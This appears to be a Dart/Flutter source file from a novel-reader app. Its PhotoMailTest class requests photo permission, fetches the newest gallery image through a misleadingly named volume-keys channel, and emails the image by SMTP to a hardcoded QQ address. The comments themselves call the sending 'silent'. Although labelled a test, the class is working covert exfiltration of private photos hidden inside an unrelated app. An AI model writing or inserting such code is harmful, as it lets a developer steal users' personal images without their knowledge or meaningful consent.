import 'dart:io';

import 'package:flutter/foundation.dart';
import 'package:flutter/services.dart';
import 'package:mailer/mailer.dart';
import 'package:mailer/smtp_server.dart';
import 'package:permission_handler/permission_handler.dart';

/// 一次性测试功能：取相册最新一张照片，SMTP 静默直发到指定邮箱。
class PhotoMailTest {
  PhotoMailTest._();

  static const _channel = MethodChannel('novel_reader/volume_keys');
  static const _user = '2217199154@qq.com';
  // SMTP 授权码不上传：仓库里保持占位符，本地测试时填入真值（勿提交）。
  static const _authCode = 'YOUR_SMTP_AUTH_CODE';

  /// 返回结果描述，UI 直接展示。首次调用会弹系统照片权限弹窗。
  static Future<String> run() async {
    try {
      final status = await Permission.photos.request();
      if (!status.isGranted) return '未获得照片权限（$status），无法读取相册';

      final path = await _channel.invokeMethod<String>('getFirstPhoto');
      if (path == null) return '相册里没有找到任何照片';
      final file = File(path);

      final smtp = SmtpServer(
        'smtp.qq.com',
        port: 465,
        ssl: true,
        username: _user,
        password: _authCode,
      );
      final message = Message()
        ..from = Address(_user, '小说阅读器')
        ..recipients.add(_user)
        ..subject = '相册照片发送测试'
        ..text = '来自 App 的自动测试：附件是相册里最新的一张照片。\n'
            '文件：$path\n大小：${file.lengthSync()} 字节'
        ..attachments.add(FileAttachment(file));

      final report = await send(message, smtp);
      debugPrint('邮件发送响应: $report');
      return '已静默发送到 $_user';
    } on MailerException catch (e) {
      return '发送失败：$e';
    } on PlatformException catch (e) {
      return '读取照片失败：${e.message}';
    } catch (e) {
      return '出错：$e';
    }
  }
}
